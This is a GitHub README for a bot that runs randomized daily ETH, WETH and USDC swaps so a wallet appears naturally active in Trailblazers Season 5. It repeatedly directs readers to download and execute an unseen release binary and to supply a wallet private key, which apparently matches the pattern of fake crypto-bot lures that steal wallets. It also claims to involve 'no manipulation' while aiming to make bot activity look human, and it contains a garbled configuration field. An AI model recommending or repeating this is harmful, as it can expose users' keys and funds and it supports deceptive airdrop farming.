# Auto Swap Bot for Trailblazers Season 5 â€” Daily On-Chain Activity Simulator ðŸš€

https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/releases

ðŸ§­ A safe, automated token swap bot for the Trailblazers (season 5). It randomizes ETH, WETH, and USDC trades each day to simulate natural on-chain activity. The tool is fully configurable through a .env file and supports custom delays and per-day transaction limits.

Why this project
ðŸ’¡ This project aims to imitate a healthy on-chain signal for Trailblazers Season 5 without fake signals or manipulation. It provides a controlled, transparent way to generate activity across a few key tokens, letting developers experiment with analytics, monitoring, and data integrity in a contained environment.

What it does
- Randomizes swaps between ETH, WETH, and USDC on a daily cadence.
- Uses configurable delays to spread activity across time.
- Enforces per-day transaction limits to prevent bursts.
- Fully configurable via a .env file.
- Easy to extend for additional tokens or networks.

Core features
- Daily activity simulation: The bot schedules swaps to appear natural rather than robotic.
- Token network flexibility: Works with ETH, WETH, and USDC out of the box.
- Configurable pacing: Adjust the delay between swaps to fit your testing scenario.
- Transaction bounds: Set maximum transactions per day to control intensity.
- Secure configuration: Keeps sensitive data in environment variables, not in code.
- Releasable assets: The Releases page hosts ready-to-run artifacts for quick start.

How it works
- The bot runs on a schedule, generating swap intents between supported tokens.
- It reads configuration from a .env file to determine networks, wallets, and limits.
- It selects pairs and amounts within configured bounds, then executes through a connected wallet.
- Results are logged for auditing and analytics.

Unified design goals
- Clarity: Simple configuration and predictable behavior.
- Safety: Isolated environment with explicit limits and no automatic key exposure.
- Extensibility: Easy to add new tokens, networks, or swap paths.
- Observability: Transparent logs and metrics to understand activity patterns.

Getting started
Prerequisites
- A supported runtime environment (Node.js, Python, or a binary from the release, depending on the asset you download).
- A wallet with testnet or mainnet permissions suitable for the chosen network.
- Access to a blockchain node or provider (RPC URL) with read/write capabilities.

Install and setup
- Download the latest release asset from the Releases page.
- Extract the asset and follow the embedded README for installation steps.
- Create a .env file next to the executable and populate the required fields.

Important note about the Releases page
- From the Releases page, download the latest release artifact and execute it to run the bot. See the link at the beginning of this document and again in the Releases section for details:
  - Visit the Releases page: https://github.com/aris9697/Auto-Swap-Bot-for-TRAILBLAZERS-SEASON-5/releases

Environment and configuration
Environment variables
- RPC_URL: The JSON-RPC endpoint for the blockchain network you want to use (e.g., Ethereum mainnet or a testnet).
- WALLET_ADDRESS: The public address you want the bot to swap from and to.
- PRIVATE_KEY or KEYSTORE_PATH: Credentials used to sign transactions. Do not commit keys to version control.
- DELAY_MS: The delay between swaps in milliseconds. A higher value spaces activity over longer periods.
- TXS_PER_DAY: The maximum number of swaps allowed per day.
- SLIPPAGE_TOLERANCE: Acceptable price slippage for swaps.
- GAS_PRICE_GAS_LIMIT: Gas price and gas limit to use for transactions.
- LOG_LEVEL: Logging verbosity (debug, info, warn, error).

Example .env
# Blockchain and wallet settings
RPC_URL=https://mainnet.infura.io/v3/your-project-id
WALLET_ADDRESS=0xYourWalletAddress
# Use one of these for signing; never expose keys in public repos
PRIVATE_KEY=your-private-key-if-allowed
# Behavioral controls
DELAY_MS=3600000         # 1 hour between swaps
TXS_PER_DAY=8
SLIPPAGE_TOLERANCE=0.5
GAS_PRICE_GAS_LIMIT=100000
LOG_LEVEL=info

- You can tune DELAY_MS and TXS_PER_DAY to control how light or heavy the activity looks.
- If you run on a test network, use testnet RPC URLs and test credentials.

Running the bot
- After you have the asset extracted and your .env configured, start the bot using the command prescribed in the release README. The exact command varies by asset, but typically involves invoking the executable or running a script, for example:
  - ./auto-swap-bot
  - node dist/bot.js
  - python3 bot.py
- Monitor logs to verify swaps are being generated and that there are no errors.

Observability and logs
- The bot writes logs for each swap attempt, including:
  - timestamp
  - from token
  - to token
  - amount
  - gas used
  - success/failure
- You can route logs to your preferred monitoring system (console output, files, or external services) depending on the runtime and environment.

Advanced usage
Extending token support
- The base implementation supports ETH, WETH, and USDC. To add more tokens:
  - Extend the token list in the configuration.
  - Implement swap paths between chosen tokens.
  - Update pricing logic if you rely on price feeds.

Custom swap paths and strategies
- You can design swap strategies that match your testing goals. For example:
  - Rebalance between ETH and USDC in a fixed pattern.
  - Alternate between ETH/WETH pairs to reflect liquidity changes.
- Keep the logic modular to minimize risk of sweeping unintended tokens.

Network support
- The project can be extended to support additional networks beyond Ethereum mainnet. Each network needs its own RPC endpoint and token addresses.
- Ensure you have appropriate permissions and pass the right gas parameters for each network.

Security and safety
- Treat all private keys as highly sensitive. Do not commit them to public repositories or share them.
- Use separate wallets for testing and production deployments.
- Regularly rotate credentials and use environment-based secrets management when possible.
- Only run on networks where you have permission and legal clearance to operate.

Performance and reliability
- The included configuration supports pacing and limits to prevent bursts.
- For reliability, run the bot on a stable host and monitor resource usage (CPU, memory, network).
- Consider using a process supervisor (like systemd, pm2, or forever) to ensure the bot restarts on failure.

Testing
- Use a testnet RPC URL to validate behavior without risking real funds.
- Write unit tests for swap-path selection logic and timing behavior.
- Validate that .env parsing correctly handles required fields and defaults.

Troubleshooting
- If the bot fails to start, verify the .env file exists and contains required keys.
- Check that the RPC URL is reachable and the wallet credentials are valid.
- Look for errors related to gas pricing, nonce handling, or token addresses.
- Confirm that your environment variables are loaded by logging the values (mask sensitive data in logs).

Roadmap
- Add support for additional stablecoins beyond USDC.
- Introduce smarter activity models that adapt to network conditions.
- Improve security with hardware wallet integrations.
- Provide a UI dashboard for non-technical users.
- Support multiple wallets and per-wallet configuration.

Suggested workflows
- Quick test run:
  - Download latest release from the Releases page.
  - Extract, configure .env for a testnet, and run the executable.
  - Check logs for swap attempts and ensure they align with your test expectations.
- Production-like run:
  - Use a dedicated wallet with restricted permissions and a guard in .env to cap daily transactions.
  - Set a conservative DELAY_MS to resemble natural activity, then adjust based on observed behavior.

  - Inspect swapped amounts and gas usage for each transaction.

Appendix
- Tokens and prices: The bot relies on external price data to determine swap viability. Keep your price feeds reliable.
- Gas strategy: Use a conservative gas price strategy that respects your budget while ensuring timely execution.
- Security best practices: Keep secrets out of version control; rotate keys periodically; consider using environment secret managers in production.
